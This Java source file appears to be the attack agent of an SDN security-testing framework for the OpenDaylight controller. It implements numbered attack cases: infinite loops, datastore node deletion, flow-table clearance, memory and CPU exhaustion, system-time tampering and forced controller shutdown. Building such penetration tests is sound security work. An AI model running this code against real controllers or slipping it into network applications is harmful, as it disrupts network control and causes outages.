/**
 * Copyright (c) 2014 Cisco Systems, Inc. and others.  All rights reserved.
 * <p>
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v1.0 which accompanies this distribution,
 * and is available at http://www.eclipse.org/legal/epl-v10.html
 */

package org.deltaproject.odlagent.core;

import com.google.common.util.concurrent.CheckedFuture;
import org.deltaproject.odlagent.utils.FlowUtils;
import org.deltaproject.odlagent.utils.InventoryUtils;
import org.deltaproject.odlagent.utils.PacketUtils;
import org.deltaproject.odlagent.utils.TestProviderTransactionUtil;
import org.opendaylight.controller.md.sal.binding.api.DataBroker;
import org.opendaylight.controller.md.sal.binding.api.ReadOnlyTransaction;
import org.opendaylight.controller.md.sal.binding.api.WriteTransaction;
import org.opendaylight.controller.md.sal.common.api.data.LogicalDatastoreType;
import org.opendaylight.controller.md.sal.common.api.data.TransactionCommitFailedException;
import org.opendaylight.yang.gen.v1.urn.ietf.params.xml.ns.yang.ietf.yang.types.rev130715.MacAddress;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.FlowCapableNode;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.FlowId;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.Table;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.TableKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.Flow;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.FlowBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.FlowKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.RemoveFlowInputBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.SalFlowService;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.statistics.rev130819.FlowStatisticsData;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.FlowCookie;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.flow.Match;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.*;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.node.NodeConnectorKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.Node;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.NodeKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingListener;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingService;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketReceived;
import org.opendaylight.yangtools.yang.binding.InstanceIdentifier;
import org.slf4j.Logger;
import org.deltaproject.odlagent.tests.SystemTimeSet;
import org.slf4j.LoggerFactory;

import java.math.BigInteger;
import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.atomic.AtomicLong;

/*
 *
 */
public class AppAgentFacadeImpl implements AppAgentHandler, PacketProcessingListener {
    class CPU extends Thread {
        int result = 1;

        @Override
        public void run() {
            // TODO Auto-generated method stub
            while (true) {
                result = result ^ 2;
            }
        }
    }

    private static final byte[] ETH_TYPE_IPV4 = new byte[]{0x08, 0x00};
    private static final int DIRECT_FLOW_PRIORITY = 1024;
    private AtomicLong flowIdInc = new AtomicLong();
    private AtomicLong flowCookieInc = new AtomicLong(0x2a0d00000L);

    private static final Logger LOG = LoggerFactory
            .getLogger(AppAgentFacadeImpl.class);

    private Map<MacAddress, NodeConnectorRef> mac2portMapping;
    private Map<String, InstanceIdentifier<Table>> node2table;

    private FlowCommitWrapper dataStoreAccessor;
    private PacketProcessingService packetProcessingService;
    private PacketInDispatcherImpl packetInDispatcher;
    private DataBroker dataBroker;
    private SalFlowService salFlowService;

    private ArrayList<NodeId> nodeIdList;

    public Interface cm;

    private boolean isDrop;
    private boolean isLoop;

    public AppAgentFacadeImpl() {
        nodeIdList = new ArrayList<>();
        mac2portMapping = new HashMap<>();
        node2table = new HashMap<>();
    }

    public void setDataBroker(DataBroker db) {
        this.dataBroker = db;
    }

    public void setSalFlowService(SalFlowService sal) {
        this.salFlowService = sal;
    }

    @Override
    public synchronized void onSwitchAppeared(InstanceIdentifier<Table> appearedTablePath) {
        LOG.debug("expected table acquired, learning ..");

        /*
         * appearedTablePath is in form of /nodes/node/node-id/table/table-id
         * so we shorten it to /nodes/node/node-id to get identifier of switch.
         *
         */
        InstanceIdentifier<Node> nodePath = InstanceIdentifierUtils.getNodePath(appearedTablePath);
        //packetInDispatcher.getHandlerMapping().put(nodePath, this);

        NodeId nodeId = nodePath.firstKeyOf(Node.class, NodeKey.class).getId();
        nodeIdList.add(nodeId);

        String tempstr = appearedTablePath.toString();
        String swid = tempstr.substring(tempstr.indexOf("openflow"), tempstr.indexOf("openflow") + 10);
        node2table.put(swid, appearedTablePath);
    }

    @Override
    public void onPacketReceived(PacketReceived notification) {
        // read src MAC and dst MAC
        byte[] dstMacRaw = PacketUtils.extractDstMac(notification.getPayload());
        byte[] srcMacRaw = PacketUtils.extractSrcMac(notification.getPayload());
        byte[] etherType = PacketUtils.extractEtherType(notification.getPayload());

        if (Arrays.equals(ETH_TYPE_IPV4, etherType)) {
            MacAddress dstMac = PacketUtils.rawMacToMac(dstMacRaw);
            String dstMacStr = PacketUtils.rawMacToString(dstMacRaw);
            MacAddress srcMac = PacketUtils.rawMacToMac(srcMacRaw);

            NodeConnectorKey ingressKey = InstanceIdentifierUtils.getNodeConnectorKey(notification.getIngress().getValue());
            NodeConnectorId connectorId = ingressKey.getId();

            /*
            LOG.info("[DELTA] " + connectorId.getValue());
            LOG.info("[DELTA] Received packet from MAC match: {}, ingress: {}", srcMac, ingressKey.getId());
            LOG.info("[DELTA] Received packet to   MAC match: {}", dstMac);
            LOG.info("[DELTA] Ethertype: {}", Integer.toHexString(0x0000ffff & ByteBuffer.wrap(etherType).getShort()));
            */

            mac2portMapping.put(srcMac, notification.getIngress());
            NodeConnectorRef destNodeConnector = mac2portMapping.get(dstMac);

            if (destNodeConnector != null && !destNodeConnector.equals(notification.getIngress())) {
                // LOG.info(connectorId.toString() + "->" + destNodeConnector);
                InstanceIdentifier<Table> tablePath = null;
                for (String key : node2table.keySet()) {
                    if (connectorId.toString().contains(key)) {
                        tablePath = node2table.get(key);
                    }
                }

                if (tablePath == null)
                    return;

                //NodeId ingressNodeId = InventoryUtils.getNodeId(notification.getIngress());
                //FlowUtils.programL2Flow(dataBroker, ingressNodeId, dstMacStr, connectorId, InventoryUtils.getNodeConnectorId(destNodeConnector));
            }
        }
    }

    @Override
    public void setRegistrationPublisher(
            DataChangeListenerRegistrationHolder registrationPublisher) {
        // NOOP
    }

    @Override
    public void setDataStoreAccessor(FlowCommitWrapper dataStoreAccessor) {
        this.dataStoreAccessor = dataStoreAccessor;
    }

    @Override
    public void setPacketProcessingService(
            PacketProcessingService packetProcessingService) {
        this.packetProcessingService = packetProcessingService;
    }

    /**
     * @param packetInDispatcher
     */
    public void setPacketInDispatcher(PacketInDispatcherImpl packetInDispatcher) {
        this.packetInDispatcher = packetInDispatcher;
    }

    public void connectManager() {
        cm = new Interface();
        cm.setAgent(this);
        cm.setServerAddr();
        cm.connectServer("AppAgent");
        cm.start();

        LOG.info("[DELTA] manager connected");
    }

    public void setControlMessageDrop() {
        this.isDrop = true;
    }

    public void setInfiniteLoop() {
        this.isLoop = true;
    }

    /*
     * 3.1.030: Infinite Loops
     */
    public void testInfiniteLoop() {
        int i = 0;
        LOG.info("[DELTA] Infinite Loop");

        while (true) {
            i++;

            if (i == 10)
                i = 0;
        }
    }

    /*
     * 3.1.040: Internal Storage Abuse
     */
    public String testInternalStorageAbuse() {
        LOG.info("[DELTA] Internal Storage Abuse");
        String removed = "";

        for (InstanceIdentifier<Node> node : packetInDispatcher.getHandlerMapping().keySet()) {
            WriteTransaction wt = dataBroker.newWriteOnlyTransaction();
            wt.delete(LogicalDatastoreType.OPERATIONAL, node);
            CheckedFuture<Void, TransactionCommitFailedException> commitFuture = wt.submit();

            try {
                commitFuture.checkedGet();
                LOG.info("[DELTA] Transaction success for REMOVE of object {}", node);
                removed += node.toString() + ", ";
            } catch (TransactionCommitFailedException e) {
                e.printStackTrace();
            }
        }

        return removed;
    }

    /*
     * 3.1.070: Flow Rule Modification
     */
    public String testFlowRuleModification() {
        LOG.info("[DELTA] Flow Rule Modification!");

        String modified = "null";

        int flowCount = 0;
        int flowStatsCount = 0;

        for (NodeId nodeId : nodeIdList) {
            NodeKey nodeKey = new NodeKey(nodeId);

            InstanceIdentifier<FlowCapableNode> nodeRef = InstanceIdentifier
                    .create(Nodes.class).child(Node.class, nodeKey)
                    .augmentation(FlowCapableNode.class);

            ReadOnlyTransaction readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            FlowCapableNode node = TestProviderTransactionUtil.getDataObject(
                    readOnlyTransaction, nodeRef);

            if (node != null) {
                List<Table> tables = node.getTable();

                for (Iterator<Table> iterator2 = tables.iterator(); iterator2.hasNext(); ) {
                    TableKey tableKey = iterator2.next().getKey();
                    InstanceIdentifier<Table> tableRef = InstanceIdentifier
                            .create(Nodes.class).child(Node.class, nodeKey)
                            .augmentation(FlowCapableNode.class).child(Table.class, tableKey);
                    Table table = TestProviderTransactionUtil.getDataObject(
                            readOnlyTransaction, tableRef);

                    if (table != null) {
                        if (table.getFlow() != null) {
                            List<Flow> flows = table.getFlow();
                            // LOG.info("[DELTA] Flowsize : " + flows.size());

                            for (Iterator<Flow> iterator3 = flows.iterator(); iterator3.hasNext(); ) {
                                flowCount++;
                                FlowKey flowKey = iterator3.next().getKey();
                                InstanceIdentifier<Flow> flowRef = InstanceIdentifier
                                        .create(Nodes.class).child(Node.class, nodeKey)
                                        .augmentation(FlowCapableNode.class).child(Table.class, tableKey)
                                        .child(Flow.class, flowKey);

                                Flow flow = TestProviderTransactionUtil.getDataObject(
                                        readOnlyTransaction, flowRef);

                                if (flow != null) {
                                    modified = flow.toString() + "\n";
                                    FlowStatisticsData data = flow
                                            .getAugmentation(FlowStatisticsData.class);
                                    if (null != data) {
                                        flowStatsCount++;
                                        // LOG.info("[DELTA] Flow 2 : " + data.toString());
                                    }
                                }

                            }
                        }
                    }
                }
            }
        }

        if (flowCount == flowStatsCount) {
            LOG.info("flowStats - Success");
        } else {
            LOG.info("flowStats - Failed");
            LOG.debug("System fetchs stats data in 50 seconds interval, so pls wait and try again.");
        }

        return modified;
    }

    /*
     * 3.1.080: Flow Table Clearance
     */
    public String testFlowTableClearance(boolean infinite) {
        LOG.info("[DELTA] Flow Table Clearance");

        String modified = "";
        int cnt = 0;

        while (cnt != 100) {
            for (NodeId id : nodeIdList) {
                RemoveFlowInputBuilder flowBuilder = new RemoveFlowInputBuilder()
                        .setBarrier(false)
                        .setNode(InventoryUtils.getNodeRef(id));

                if (salFlowService == null)
                    LOG.info("salFlowService is NULL");
                else
                    salFlowService.removeFlow(flowBuilder.build());
            }
            cnt++;

            if (!infinite)
                break;
        }

        return modified;
    }

    /*
     * 3.1.110: Memory Exhaustion
     */
    public void testResourceExhaustionMem() {
        LOG.info("[DELTA] Resource Exhausion : Mem");

        ArrayList<long[][]> arry;
        arry = new ArrayList<long[][]>();

        while (true) {
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
        }
    }

    /*
     * 3.1.120: CPU Exhaustion
     */
    public void testResourceExhaustionCPU() {
        LOG.info("[DELTA] Resource Exhausion : CPU");
        int thread_count = 0;

        for (int count = 0; count < 1000; count++) {
            CPU cpu_thread = new CPU();
            cpu_thread.start();
            thread_count++;

            LOG.info("[AppAgent] Resource Exhausion : Thread "
                    + thread_count);
        }
    }

    /*
     * 3.1.130: System Variable Manipulation
     */
    public boolean testSystemVariableManipulation() {
        LOG.info("[DELTA] System Variable Manipulation");

        SystemTimeSet systime = new SystemTimeSet();
        systime.start();
        return true;
    }

    /*
     * 3.1.140: System Command Execution
     */
    public void testSystemCommandExecution() {
        LOG.info("[AppAgent] System Command Execution : EXIT Controller");
        System.exit(0);
    }
}